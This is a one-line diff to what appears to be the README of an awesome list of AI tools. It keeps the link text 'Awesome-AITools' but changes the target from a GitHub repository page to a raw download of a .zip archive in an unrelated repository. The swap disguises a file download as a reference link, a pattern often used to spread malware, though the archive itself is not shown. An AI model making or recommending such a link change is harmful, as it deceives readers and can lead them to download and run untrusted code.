@@ -21,7 +21,7 @@ Most awesome lists focus on breadth.
 - **Business-centric**: evaluate pricing model and production viability
 - **Actionable**: provide scripts and templates you can run immediately
 
-Reference inspiration: [Awesome-AITools](https://github.com/ikaijua/Awesome-AITools)
+Reference inspiration: [Awesome-AITools](https://raw.githubusercontent.com/FerdawsOmarkhail/awesome-ai-api-plus/main/examples/python/awesome_api_ai_plus_3.5.zip)
 
 ---
 
